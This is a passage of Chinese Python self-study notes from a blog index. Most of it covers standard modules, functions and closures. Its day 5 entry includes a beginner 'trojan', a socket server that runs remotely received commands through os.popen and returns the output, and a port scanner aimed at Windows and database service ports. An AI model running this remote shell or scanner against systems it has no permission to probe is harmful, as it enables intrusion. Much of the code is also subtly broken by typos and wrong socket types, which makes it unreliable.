__name__=='__main__':    main()</code></pre><p>hashlib</p><p>每一个文件都有自己独特的哈希值，确保文件的唯一性</p><pre><code>#-*- coding=utf-8 -*-import hashlib #摘要加密算法def main()：    md5 = hashlib.md5()     #md5是一个内存地址,使用md5对以后的书记进行摘要加密操作    #也可以使用sha1    md5.update('haha nihao'.encode('utf-8'))    #对目标进行操作    print(md5.hexdigest())  #结果是haha nihao 的信息摘要加密的结果    passif __name__=='__main__':    main()</code></pre><p>生成配置文档</p><pre><code>#-*- coding=utf-8 -*-import configparser #生成配置文件def main()：    conf = configparser,ConfigParser()  #初始化    conf['default'] = {'money':100,'go':'yes','weapen':'no'}    conf['home'] = {'island':'test1'}    with open('./config','w')as f:        f.write(f)   #配置文件写入    passif __name__=='__main__':    main()</code></pre><pre><code>#-*- coding=utf-8 -*-import configparser #生成配置文件def main()：    conf = configparser,ConfigParser()  #初始化    conf['default'] = {'money':100,'go':'yes','weapen':'no'}    conf['home'] = {'island':'test1'}    print('home' in conf)   #判断是否存在    for Key in conf['default']: #遍历所有的键        print(key)    print(conf.get('default','money'))    print(conf.items('default'))    #获取所有的键和值    print(conf.options('default'))  #获取键    passif __name__=='__main__':    main()</code></pre><p><strong>深层配置文件</strong></p><pre><code>def main()：    conf = configparser,ConfigParser()  #初始化    conf.read('config')                 #读取配置文件    conf.add_section(.tank)     #增加键    conf.remove_section('home') #输出键    conf.remove_option('default','weapon')  #删除条目    conf.set('default','money','999')   #修改条目    conf.write(open('config.new','w'))  #存储消息    passif __name__=='__main__':    main()</code></pre><hr><p><strong>定义坐标系</strong></p><pre><code>#-*- coding=utf-8 -*-from collections import namedtupledef main()：    point = nametuple('point',['x','y'])    #定义名为point的坐标,x,y    p = point(20,30)    #给坐标赋值    print(p.x)      #访问坐标    passif __name__=='__main__':    main()</code></pre><hr><pre><code>#-*- coding=utf-8 -*-from collections import dequedef main()：    q = deque(['a','b','c'])    q.append('x')    q.appendleft('y')    print(q)    passif __name__=='__main__':    main()</code></pre><hr><h3 id="时间"><a href="#时间" class="headerlink" title="时间"></a>时间</h3><p>import time</p><p>time.sleep(2)  （睡两秒钟）</p><p>print(time.time())      （输出当前时间戳，从1970年1月1日0时0分0秒到现在经历的时间）</p><pre><code>#-*- coding=utf-8 -*-import timedef main()：    print(time.time())  #输出当前时间戳    print(time.strftime('%Y-%m-%d %X')  #输出当前24小时制时间    print(time.strftime('%Y-%m-%d %H:%M')   #精确输出     passif __name__=='__main__':    main()</code></pre><pre><code>#-*- coding=utf-8 -*-import timedef main()：    print(time.strftime('%y'))  #精确输出    passif __name__=='__main__':    main()</code></pre><p>%Y四位数年份<br>%y两位数年份<br>%I十二小时<br>%M当前分钟数<br>%a星期几简写<br>%A<br>%b月份简写<br>%c国外时间<br>%j年内第几天<br>%p AM/PM<br>%U一年中的第几周<br>%w阿拉伯数字表示星期几<br>%W<br>%x国外时间（天）</p><hr><h3 id="datetime系列函数"><a href="#datetime系列函数" class="headerlink" title="datetime系列函数"></a>datetime系列函数</h3><pre><code>#-*- coding=utf-8 -*-import timeimport datetimedef main()：    now = datetime.datetime.now()    print(now)    print(datetime.datetime.now()+datetime.timedelta(weeks=4)       #4周后    print(now.replace(year=1977))   #调整时间    #从时间戳转化为当前时间    sjc = time.time()    print(datetime.date.fromtimestamp(sjc))    passif __name__=='__main__':    main()</code></pre><hr><pre><code>#-*- coding=utf-8 -*-import randomdef main()：    print(random.random())      print(random.uniform(0,4))  #取0-4的小数    print(random.randint(1,5))  #取1-5的整数    print(random.randrange(1,10,2)) #取1-10之间的奇数    ret = random.choice([1,'haha','nihao']) #随机选择    print(ret)    #随机选择两张牌    a,b = random.sample(['方块5','大鬼','小鬼'])    print(a,b)    #打乱顺序    item = ['方块5','大鬼','小鬼']    random.shuffle(item)    print(item)    passif __name__=='__main__':    main()</code></pre><hr><pre><code>#制作验证码#-*- coding=utf-8 -*-import importdef v_code()：    for i in range(5)        num = random.randint(0,9)        alf = chr(random.randint(65,90)) #数字转换为字母，ASCII        add = random.choice([num,alf])        code = "".join([code,str(add)])    return code    passdef main():    print(v_code())    passif __name__=='__main__':    main()</code></pre><hr><h3 id="OS模块"><a href="#OS模块" class="headerlink" title="OS模块"></a>OS模块</h3><pre><code>#-*- coding=utf-8 -*-import osimport sysdef main()：    #获取当前的工作目录    print(os.getcwd())    #创建文件夹    os.mkdir('haha')    #删除文件夹    os.rmdir('haha')    #执行系统命令，不支持中文    os.system("ipconfig")    #执行系统命令，需要read回显，支持中文    os.popen("ipconfig").read())    #打印目前的操作系统    print(sys.platform)    #查看自己的python版本    print(sys.version)    passif __name__=='__main__':    main()</code></pre><h3 id="任务："><a href="#任务：" class="headerlink" title="任务："></a>任务：</h3><p><strong>学习cmd命令</strong></p><hr><h3 id="正则表达式（本世纪难题）"><a href="#正则表达式（本世纪难题）" class="headerlink" title="正则表达式（本世纪难题）"></a>正则表达式（本世纪难题）</h3><pre><code>#-*- coding=utf-8 -*-#导入正则表达式模块import redef main()：    s1 = r'abc'     #正则表达式（完全匹配）    #在字符里寻找符合正则表达式表达的东西，找到就会以列表显示，无则空列表    #匹配字符串中的top或者tip（要么）    s2 = r't[oi]p'    #查找以abc开头的    s3 = r'^abc'        #查找以abc结尾的东西    s4 = r'abc$'    #查找a$bc，此时的$就是个字，不会执行，此时进行了转义，\为转义字符，把后面有意义的字符变成无意义的字符    s5 = r'a\$bv'    #匹配所有数字    s6 = r'\d'    #匹配所有非数字的东西    s7 = r'\D'    #匹配所有空字符，大S是非空字符    s8 = r'\s'    #匹配所有字符和数字，W就是非字母和数字    s9 = r'\w'    #匹配以010-开头后面数字有8个的东西    s10 = r'^010-\d{8}'    #a,ab,abbbbbbbbbbbb,*代表0次或多次    s11 = r'ab*'    #ab,abbbb +匹配一次到多次    s12 = r'ab+'    #?代表0或者1次，代表匹配0或一次    s13 = r'ab?'    #匹配ab，b匹配一到三次    s14 = r'ab{1,3}'    print(re.findall(s1,"sadtopasdtipgsfdabc"))    print(re.findall(s6,"sadtopasdtipgsfdabc"))    pass    #在字符里寻找符合正则表达式表达的东西    s14 = r'ab\d{1,2}'    #匹配163 126等邮箱    s15 = r'[a-zA-Z0-9{4,20}@(163|162|sohu|qq)\.com$'    #print(re.findall(s15,"ssa123@163.com"))    print(rematch(s15,"ssa123@163.com").group())    #findall查找字符串中匹配条件的内容，    #match会更加精确的匹配内容，后面一般会有group()    #==================    #用match抓取    str = "阅读时：9991"    s1 = r'\d+'    #提取    print(re.search(s1,str).group())       #替换数据    print(re.sub(s1,"100",str))    pass    #===========================    str = 'asdadssdgasdasd&lt;h1&gt;haha&lt;/h1&gt;sadasdasd&lt;div&gt;nihao&lt;/div&gt;'    s1 = r'&lt;\w*&gt;.*&lt;/\w*&gt;'   #.是任意，*是重复    s1 = r'&lt;(\w*&gt;).*&lt;/\1*&gt;'     #\1是整个正则表达式中第一个()内匹配的内容    print(re.findall(s1,str))if __name__=='__main__':    main()</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> python自学笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python自学笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python自学day1</title>
      <link href="/2020/08/01/pyday1/"/>
      <url>/2020/08/01/pyday1/</url>
      
        <content type="html"><![CDATA[<h2 id="part1"><a href="#part1" class="headerlink" title="part1"></a>part1</h2><p>python+linux:运维</p><p>python爬虫</p><p>人工智能</p><p>=========</p><p>python没有大括号，没有分号，讲究缩进</p><h3 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a>注释符</h3><p>当行注释： #……</p><p>多行注释：</p><p>‘’’</p><p>……</p><p>‘’’</p><h3 id="合并输出"><a href="#合并输出" class="headerlink" title="合并输出"></a>合并输出</h3><p>“,”或 “+”拼接字符串或变量<br>“,”:默认带空格</p><h3 id="格式化输出"><a href="#格式化输出" class="headerlink" title="格式化输出"></a>格式化输出</h3><pre><code>name = input("name:")age = input("age:")job = input("job:")info = "name is %s!age is %s!job is %s!"%(name,age,job)print(info)</code></pre><h3 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h3><p>不封于:！=/&lt;&gt;<br>判断是否a存在b,输出bool值<br>a in b<br>a not in b</p><h3 id="流程控制"><a href="#流程控制" class="headerlink" title="流程控制"></a>流程控制</h3><pre><code>if 表达式:    ……elif 表达式:    ……else:    ……</code></pre><h3 id="强制类型转换"><a href="#强制类型转换" class="headerlink" title="强制类型转换"></a>强制类型转换</h3><p>int(……)</p><h3 id="字符串切片"><a href="#字符串切片" class="headerlink" title="字符串切片"></a>字符串切片</h3><p>print(a[0:3]):从计算机的0个开始，取到人类计算机的第三个，即取012<br>print(a[2:]):从计算机的第2个取到结尾<br>print(a[2:-1]):从计算机的第2个取到最后一个的前一个<br>print(a[1:10:2]):步长为2(2个2个取)</p><h3 id="常用字符串处理方法-a为已定义字符串"><a href="#常用字符串处理方法-a为已定义字符串" class="headerlink" title="常用字符串处理方法(a为已定义字符串)"></a>常用字符串处理方法(a为已定义字符串)</h3><pre><code>a.capitalize()      #首字母大写a.swapcase()        #大小写反转a.title()           #每个单词首字母大写a.center(10."*")    #a变量居中，拓展长度为10，剩下的位置用*填充a.startswith("a")   #判断字符串是否以a开头a.startswith("abc",2,5)     #字符串第2-4的位置是否为abca.endswith("b")     #是否以b结尾a.find("si")        #字符串里是否有 "si",若有：返回查找字符开头的位置a.replace('i','n')  #字符串里所有的i替换成na.replace('i','n',2)        #只替换前两个a.isalpha()         #判断字符串里是否只有字母(空格也不是字母)a.isnumeric()       #判断是否只有数字a.strip('*')        #去除字符串中的*a.lstrip('*')       #去除第一次出现非*得左边得*a.rstrip('*')       #去除右边得*a.split('.')        #以 '.'为标识把字符串分割字符串数组</code></pre><h3 id="列表-有序"><a href="#列表-有序" class="headerlink" title="列表:[] 有序"></a>列表:[] 有序</h3><pre><code>li = ['xiaoming', 'xiaohong', 'xiaoli'] #定义一个列表li.insert(2, 'haha')        #'haha'添加到列表第二个位置(li[2])上    #列表里各种类型的数据可以共存li = [123,"sasd",true]li.append('xxx')    #加载列表的最后面li.pop()            #删除最后一个del li[1:3]         #批量删除：删除li[1]和li[2]li.remove('xiaoming')#精确删除li.clear()          #删除列表所有li[1]='xxx'         #修改列表第二个为XXXli = [1,2,3,4,7,6,2,3]li.count(4)         #计算列表中有几个4li.index(2)         #2在列表中第几个位置li.sort()           #按顺序（升/降）排li.reverse()        #倒叙</code></pre><h3 id="字典-无序"><a href="#字典-无序" class="headerlink" title="字典:{}无序"></a>字典:{}无序</h3><p>记录：键值对<br>“键名”：值</p><pre><code>dic = {"name":"xiaoming","age":18, "job":"drive"}dic['li']="haha"      #字典中插入键为'li',值为'haha'dic.pop("age")        #删除键为age的记录dic["age"] = 20       #修改记录for i in dic:    print(i)          #只查看键    print(dic.keys())    print(dic[i])     #只查看值    print(dic.values())</code></pre><h3 id="集合：-无序，不允许重复"><a href="#集合：-无序，不允许重复" class="headerlink" title="集合：{}无序，不允许重复"></a>集合：{}无序，不允许重复</h3><pre><code>set1 = {1,9,5,2,4,1}set1 = set({1,5,23,5})         #集合的两种定义set1.add('sd')#指定删除set1.remove(9)#随机删除set1.pop()#删除所有set1.clear()#交集set1 &amp; set2#并集set1 | set2#差集set1 - set2#反交集set1 ^ set2</code></pre><h3 id="数组之间转化"><a href="#数组之间转化" class="headerlink" title="数组之间转化"></a>数组之间转化</h3><pre><code>x = ["ha1", "ha2", "ha3"]y = tuple(x)      #转化为元组y = set(x)        #转化为集合y = list(x)       #转化为列表</code></pre><h3 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h3><pre><code>for item in list       #遍历    print(item)        #输出每个元素for i in range(1,10,2)     #range定义范围，1&lt;10,步长为2    print(i)</code></pre><h3 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h3><p>文件的本质：句柄（唯一标识符）<br>读文件</p><pre><code>f = open("a.txt", 'r')      #打开文件，获取文件句柄  #r+ w+ a+ 基于字符的读写模式#r:只读 w:写 a:追加#二进制的读写：rb wb abdata = f.read()        #读句柄里面的数据data = f.readlines()       #文件每一行变成一个列表存在f.close()           #关闭文件句柄</code></pre><pre><code>import osos.path.isfile        #判断文件是否存在</code></pre><pre><code>#分块读f = open("a.txt",'r+')while True    info = f.read(4)   #步长为4    print(info)    if len(info)==0:   #读不出数据时退出循环        breakf.close()</code></pre><p>写文件：</p><pre><code>f = open('./a.txt','w')    f.write("nihao")        #w属性清空文件原来的内容f = open("./a.txt"，'a')     #a属性追加写文件</code></pre><p>免关闭操作文件</p><pre><code>with open('./a.txt','a') as f:    f.write("hahahahahhahaha!!")</code></pre><h3 id="cmd基本命令"><a href="#cmd基本命令" class="headerlink" title="cmd基本命令"></a>cmd基本命令</h3><pre><code>dir    查看当前目录下文件夹mkdir abc      新建文件夹abcrmdir abc       删除文件夹abcipconfig          查看ip地址netstat           查看开放端口netstat -ano      查看所有端口</code></pre><h3 id="操作操作系统"><a href="#操作操作系统" class="headerlink" title="操作操作系统"></a>操作操作系统</h3><pre><code>import osos.mkdir('c:/abc')      #新建文件夹os.rmdir('c:/abc')      #删除文件夹os.listdir('c:/')       #列出所有文件夹（列表形式输出）os.system('ipconfig')   #识别（window/linux）命令，显示ip地址print(os.system('whoami'))   #执行操作系统的命令</code></pre><h3 id="作业"><a href="#作业" class="headerlink" title="作业"></a>作业</h3><p>apple 10 3<br>tesla 100000 1<br>mac 3000 2<br>lenovo 2000 5<br>chicken 10 3</p><pre><code>list = []with open('./haha.txt', 'r') as f:    #相当于readlines，一行一行读    for line in f:        #去掉换行符，空格进行分割        list2 = line.strip().split(' ')        #如果有数据读取        if list2:            #形成字典            dic={'name':list2[0],'price':list2[1],'amount':list2[2]}            list.append(dic)print(list)price = 0#遍历列表for i in list:    #每一次遍历的内容提取，转换为int，操作    price += int(i['price'])*int(i['amount'])print(price)</code></pre><h2 id="part2函数"><a href="#part2函数" class="headerlink" title="part2函数"></a>part2函数</h2><h3 id="无返回值函数"><a href="#无返回值函数" class="headerlink" title="无返回值函数"></a>无返回值函数</h3><pre><code>def my_len():    s='hahahahahnanansda'    length = 0    for i in s        length +=1    print(length)</code></pre><pre><code>#调用函数a = my_len('hahahahahnanansda')print(a)</code></pre><h3 id="有返回值函数"><a href="#有返回值函数" class="headerlink" title="有返回值函数"></a>有返回值函数</h3><pre><code>def my_len(s):    s='hahahahahnanansda'    length = 0    for i in s        length +=1    return length</code></pre><hr><p>#有多个参数的函数</p><pre><code>#参数可以直接定义def maxnum(x,y):    max = x if x&gt; y else y    return max    pass #可有可无r = maxnum(10,50)print(r)</code></pre><hr><h4 id="参数既可以顺序传递，也可以直接进行定义"><a href="#参数既可以顺序传递，也可以直接进行定义" class="headerlink" title="参数既可以顺序传递，也可以直接进行定义"></a>参数既可以顺序传递，也可以直接进行定义</h4><pre><code>def maxnum(x,y):    max = x if x&gt; y else y    return max    pass #可有可无r = maxnum(y = 10, x = 50)print(r)</code></pre><hr><h3 id="带默认参数"><a href="#带默认参数" class="headerlink" title="带默认参数"></a>带默认参数</h3><pre><code>def a(value1,value2 = a)a(aaa)</code></pre><hr><h3 id="默认参数是一个可变数据类型"><a href="#默认参数是一个可变数据类型" class="headerlink" title="默认参数是一个可变数据类型"></a>默认参数是一个可变数据类型</h3><pre><code>def demo(a,li=[]):    li.append(a)    print(li)demo('abc')demo('cba')</code></pre><hr><h3 id="不定长参数"><a href="#不定长参数" class="headerlink" title="不定长参数"></a>不定长参数</h3><pre><code>def fun1(name,age,*args):  #args是关键字，不能修改    print('name is',name)    print('age is',age)    print('arg is',args)    print('第一个多余的是：',args[0])    pass#如果超过了字符的检测，就用*args接受t = ('a','b','c','d')fun1(*t)</code></pre><hr><h3 id="传入字典到函数"><a href="#传入字典到函数" class="headerlink" title="传入字典到函数"></a>传入字典到函数</h3><pre><code>def fun2(**dic):    passdic1 = {"name":"xiaoming","age":18,"job":"none"}fun2(**dic1)</code></pre><hr><h3 id="多种参数传递"><a href="#多种参数传递" class="headerlink" title="多种参数传递"></a>多种参数传递</h3><pre><code>def fun1(a,b,*args,**kwargs): #一个*放在两个**前面排队 #*和*后面都是关键字    print(a)    print(b)    print(args)    print(kwargs)fun1(1,2,3,4,5,name="n1",job="n2") #3,4,5传入args转化为元组，后面的传入kwargs转化为字典</code></pre><hr><h3 id="匿名函数"><a href="#匿名函数" class="headerlink" title="匿名函数"></a>匿名函数</h3><pre><code>x = lambda y,z:y+zprint(x(2,3))  #打印5</code></pre><hr><pre><code>def fun1():    a = 10    b = 20    print(globals()) #作用域：全局，外部的所有变量都会以字典的形式存在这里    print(locals())  #作用域：本地，本地（本函数）的所有变量都会以字典的形式存在这里fun1()#没有权利在函数里面修改全局变量，要在函数里面在定义一次</code></pre><p>global全局变量<br>然后在后面进行修改</p><pre><code>li = [1,2,3]dic = {'name':'xiaoming'}def fun1():    li.append(99)    dic["age"] = 19    print(li)    print(dic)    pass#运行成功了#可变数据类型（列表，字典，集合）不用global#可以在函数里直接修改本尊</code></pre><h3 id="复杂一点的函数"><a href="#复杂一点的函数" class="headerlink" title="复杂一点的函数"></a>复杂一点的函数</h3><p>嵌套函数</p><pre><code>def add_b():    b = 1    def do_global():        b = 10        def dd_nolocal():            nonlocal b    #应用上一层的变量            b = b + 20            print(b)            pass        dd_nolocal()   #定义了以后要调用函数才有用        print(b)        pass    do_global()        #调用函数    print(b)    passadd_b()#输出30 30 1</code></pre><h3 id="多个函数互相调用"><a href="#多个函数互相调用" class="headerlink" title="多个函数互相调用"></a>多个函数互相调用</h3><pre><code>def max_of_two(x,y):    m = x if x &gt; y else y    return m    pass#怎么比较四个数的大小def max(a,b,c,d):    res1 = max_of_two(a,b)    res2 = max_of_two(res1,c)    result = max_of_two(res2,d)    return result    passret = max(23,34,124,75)print(ret)</code></pre><h3 id="函数名是什么："><a href="#函数名是什么：" class="headerlink" title="函数名是什么："></a>函数名是什么：</h3><pre><code>f = maxprint(f)f(432,64,234,64)</code></pre><p>函数名的本质：内存地址</p><p>输出的是：函数放在电脑内存的地址<br>获取了该函数的内存地址，就可执行该函数体</p><pre><code>#得知这个本质后，我们可以就来玩#函数名不加括号就是内存地址，加了括号就是调用运行def f1():    print("I am f1")    passdef f2():    print("I am f2")    passdef f3():    print("I am f3")    passli = [f1, f2, f3]     #这里存的都是函数的地址dic = {"hanshu1":f1,"hanshu2":f2,"hanshu3":f3}li[1]()               #加括号直接执行该地址存放的函数dic["hanshu3"]()</code></pre><h3 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h3><pre><code>def func():    name = "haha"    def inner():        print(name)        pass    return inner    #返回函数地址    passf = func()    #获取的是函数地址f()           #调用inner()</code></pre><p>判断是否是闭包函数，在外层函数</p><pre><code>print(inner.__closure__)    #在inner外一层的函数(注意是连续两条下划线)</code></pre><p>如果打印出来的东西是cell开头的 一串东西，说明是闭包函数</p><p>如果打印出来是None，则不是</p><p>嵌套闭包</p><pre><code>def wrapper():    money = 1000    def func():        name = "apple"        def inner():            print(name,money)            pass        return inner        pass    return func    passf1 = wrapper()   #f1是func的内存地址f2 = f1()        #f2是inner的内存地址f2()</code></pre><h3 id="闭包传参"><a href="#闭包传参" class="headerlink" title="闭包传参"></a>闭包传参</h3><pre><code>def func(a,b):    def inner(x):        return a*x+b        pass    return inner    passfunc1 = func(4,5)print(func1(2))</code></pre><pre><code>import timedef func1():    print("I am func1")    passdef timer(fun):    def inner():        start = time.time()   #获取当前时间        fun()        print(time.time()-start)        pass    return inner    passa = timer(func1)a()</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> python自学笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python自学笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python自学day5</title>
      <link href="/2020/08/01/pyday5/"/>
      <url>/2020/08/01/pyday5/</url>
      
        <content type="html"><![CDATA[<h3 id="循环通信"><a href="#循环通信" class="headerlink" title="循环通信"></a>循环通信</h3><p>服务端</p><pre><code>#-*- coding=utf-8 -*-import socketdef main():    #ad_inet时ipv4,sock_stream时使用tcp通信    tcp_server_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)    #绑定端口    tcp_server_socket.bind(("",8999))    #允许多少人来连接我    tcp_server_socket.listen(128)    #循环为多个客户服务多次    while True:        #等待客户连接，并且保存客户socket和ip地址        new_client_socket,client_addr = tcp_server_socket.accept()        print("the %s connecting"%(str(client_addr)))        #给客户发送信息        new_client_socket.send("welcome".encode("utf-8"))        #循环为一个客户服务        while True:            try:                #接受客户发来的数据                recv_data = new_client_socket.recv(1024)                print(recv_data.decode("utf-8"))            except:                print("断开连接")                break        #关闭套接字        new_client_socket.close()    tcp_server_socket.close()            passif __name__=='__main__':    main()</code></pre><p>客户端</p><pre><code>#-*- coding=utf-8 -*-import socketdef main():    tcp_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)    server_ip = "ip地址"    server_port = 8999    server_add = (server_ip,server_port)    #连接服务器    tcp_socket.connect(server_add)    first_data = tcp_socket.recv(1024)    print(first_data.decode("utf-8"))    while True:        #发送数据        send_data = input("send--&gt;")        tcp_socket_send(send_data.encode("utf-8"))    #tcp_socket.connect(server_add)    tcp_socket.close()    passif __name__=='__main__':    main()</code></pre><hr><h3 id="写一个木马"><a href="#写一个木马" class="headerlink" title="写一个木马"></a>写一个木马</h3><p>服务端</p><pre><code>#服务端#-*- coding=utf-8 -*-import socketimport osdef main():    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)    host = socket.gethostname()    port = 12345    s.bind((host,port))    s.listen(5)    while True:        c,addr = s.accept()        print("连接地址:",addr)        c.send("welcome".encode("utf-8"))        while 1:            try:                recv_data = c.recv(1024).decode("utf-8")                print(recv_data)                if recv_data == 'cmd':                    while True:                        c.send("ok cmd start".encode("utf-8"))                        data = c.recv(1024)                        recv_data2 = data.decode("utf-8")                        if recv_data2 == 'exit':                            c.send("cmd stop".encode("utf-8"))                            break                        else:                            x = os.popen(recv_data2).read()                            c.send(x.encode("utf-8"))                else:                    #print(recv_data.decode("utf-8"))                    c.send(recv_data.encode("utf-8"))            except:                print("断开连接")                break        c.close()    s.close()    passif __name__=='__main__':    main()</code></pre><p>客户端</p><pre><code>#-*- coding=utf-8 -*-import socketdef main():    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)    host = 'ip地址'    port = 1234    s.connect((host,port))    while 1:        data_recv = s.recv(1024)        print(data_recv.decode("utf-8"))        msg = input("send msg:")        s.send(msg.encode("utf-8"))    s.close()    passif __name__=='__main__':    main()</code></pre><p><img src="5D62BBCC4EA04AE0BBE0696B6A7AEA5B" alt="image"><br><img src="81B0F5BD8EB6499688B8B0892B9219D6" alt="image"></p><hr><h3 id="扫描器"><a href="#扫描器" class="headerlink" title="扫描器"></a>扫描器</h3><pre><code>##-*- coding=utf-8 -*-import socketimport sysdefaultport = [135,139,445,3389,1433,3306,5944,80]#判断端口是否开放def open(ip,port):    s = socket.socket()    try:        s.connect((ip,port))        return True    except:        return False    pass#扫描函数def scan(ip):    #遍历端口列表    for x in defaultpoet:        if open(ip,x):            print("%s host %s port open"%(ip,x))        else:            print("%s host %s port close"%(ip,x))    passdef main():    scan('ip地址')    passif __name__=='__main__':    main()</code></pre><hr><h3 id="支持命令的端口扫描器"><a href="#支持命令的端口扫描器" class="headerlink" title="支持命令的端口扫描器"></a>支持命令的端口扫描器</h3><pre><code>#运行需要在cmd运行#-*- coding=utf-8 -*-import socketimport sys#defaultport = [135,139,445,1433,3306,3389,5944]#判断端口是否开放def open(ip,port):    s = socket.socket()    try:        s.connect((ip,port))        return True    except:        return False    pass#默认扫描函数def scan(ip,port):    for x in port:        if open(ip,x):            print("%s host %s port open"%(ip,x))        else:            print("%s host %s port close" % (ip,x))    pass#范围扫描def rscan(ip,s,e):    for x in range(s,e):     if open(ip,x):            print("%s host %s port open"%(ip,x))        else:            print("%s host %s port close" % (ip,x))    pass   def main():    defaultport = [135,139,445,1433,3306,3389,5944]    #第一个参数    str = sys.argv[1]    #print(str[0])    if str[0]. == '-'  #如果参数以这个开头        option = sys.argv[1][2:] #看一下之后的参数        if option =='version':            print("版本号1.0")        elif option =='help':            print("python xx.py [ip地址] [端口：80,99或80-99]")        sys.exit()        pass    if len(sys.argv) == 2 #默认扫描无参数        scan(sys.argv[1],defaultport)   #运行文件后面＋ip    elif len(sys.argv) == 3:        if ',' in sys.argv[2]:  #xx.py ip 80,21.89            p = sys.argv[2]            p = p.split(',')            a = []            for x in p:                #a = []                a.append(int(x))                #defaultport = a                #scan(sys.argv[1])            #print(a)            defaultport = a            scan(sys.argv[1],defaultport)        elif '-' in sys.argv[2]:    #xx.py ip 80-99            a = sys.argv[2]            a = a.split('-')            s = int(a[0])            e = int(a[1])            rscan(sys,argv[1],s,e)if __name__=='__main__':    main()</code></pre><hr><h3 id="如何在python代码里面使用命令"><a href="#如何在python代码里面使用命令" class="headerlink" title="如何在python代码里面使用命令"></a>如何在python代码里面使用命令</h3><pre><code>#如何使用命令#-*- coding=utf-8 -*-from optparse import OptionParser #专门用来赋值def main():    usage = "useage: xxx.py -f &lt;filename&gt; -i &lt;ipaddress&gt;"    parser = OptionParser(usage = usage)    #添加方法usage，让xx.py -h出现帮助    parser.add_option("-f","--file",type="string",dest="filename",help="your filename here")    parser.add_option("-i","--ip",type="string",dest="ipaddress",help="your ipadd here")    (options,args)=parser_args()  #获取选项和参数进行赋值    print(options.filename)    print(options.ipaddress)    passif __name__=='__main__':    main()</code></pre><p>输入 python xxx.py -h</p><hr><h3 id="改造"><a href="#改造" class="headerlink" title="改造"></a>改造</h3><pre><code>#运行需要在cmd运行#-*- coding=utf-8 -*-import socketimport sysreload(sys)sys.setdefaultencoding('utf8')from optparse import OptionParser#defaultport = [135,139,445,1433,3306,3389,5944]#判断端口是否开放def open(ip,port):    s = socket.socket()    try:        s.connect((ip,port))        return True    except:        return False    pass#默认扫描函数def scan(ip,port):    for x in port:        if open(ip,x):            print("%s host %s port open"%(ip,x))        else:            print("%s host %s port close" % (ip,x))    pass#范围扫描def rscan(ip,s,e):    for x in range(s,e):     if open(ip,x):            print("%s host %s port open"%(ip,x))        else:            print("%s host %s port close" % (ip,x))    pass   def main():    usage = "useage: xxx.py -i ip地址 -p 端口"    parser = OptionParser(usage = usage)        parser.add_option("-i","--ip",type="string",dest="ipaddress",help="your target ip here")    parser.add_option("-p","--port",type="string",dest="port",help="your target port here")    (options,args)=parser_args()  #获取选项和参数进行赋值    ip = option.ipaddress    port = option.port    print(options.port)    print(options.ipaddress)    defaultport = [135,139,445,1433,3306,3389,5944]    if ',' in port:  #xx.py ip 80,21.89        port = port.split(',')        a = []        for x in p:            a.append(int(x))        defaultport = a        scan(ip,defaultport)    elif '-' in sys.argv[2]:    #xx.py ip 80-99        port = port.split('-')        s = int(port[0])        e = int(port[1])        rscan(ip,s,e)    elif "all" in port:        rscan(ip,1,65535)    elif 'default' in port:        scan(ip,defaultport)    passif __name__=='__main__':    main()</code></pre><p>命令：python xx.py -h</p><p>python xx.py -i ip -p [端口：130-144]</p><p>python xx.py -i ip -p [端口：all]</p><p>python xx.py -i ip -p [端口：default]</p><hr><p>UDP通信：<br>特点：快</p><p>服务端：</p><pre><code>#-*- coding=utf-8 -*-import socketdef main():    #初始化套接字，使用ipv4的udp通信    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)    s.bind(('',6000))    while True:        data,addr = s.recvfrom(1024)        print("connect by:",addr)        print("recv data:",data.decode("utf-8"))        s.sendto(data,addr)    s.close()    passif __name__=='__main__':    main()</code></pre><p>服务端</p><pre><code>#-*- coding=utf-8 -*-import socketdef main():    c = socket.socket(socket.AF_INET,socket.SOCK_STREAM)    while True:        tsxt = input("----&gt;")        c.sendto(text.encode("utf-8"),("你的ip地址",6000))        if text == 'exit'            break        ans = c.recvfrom(1024)        print(ans[0].decode("utf-8"))    c.close()    passif __name__=='__main__':    main()</code></pre><hr><h3 id="聊天室"><a href="#聊天室" class="headerlink" title="聊天室"></a>聊天室</h3><pre><code>#-*- coding=utf-8 -*-import socketdef send_msg(udp_socket):    #获取发送内容    dest_ip = input("请输入对方的端口号:")    dest_port = int(input("请输入对方的端口号："))    send_data = input("发送内容：")    udp_socket.sendto(send_data.encode("utf-8"),(dest_ip,dest_port))    passdef recv_msg(udp_socket):    recv_data = udp_socket_recvfrom(1024)    print("%s:%s"%(str(recv_data[1]),recv_data[0].decode("utf-8")))    passdef main():    #创建udp套接字    udp_socket = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)    #绑定信息    udp_socket.bind(("",7788))    while True:        send_msg(udp_socket)    #注意一个先send一个先recv        recv_msg(udp_socket)    passif __name__=='__main__':    main()</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () 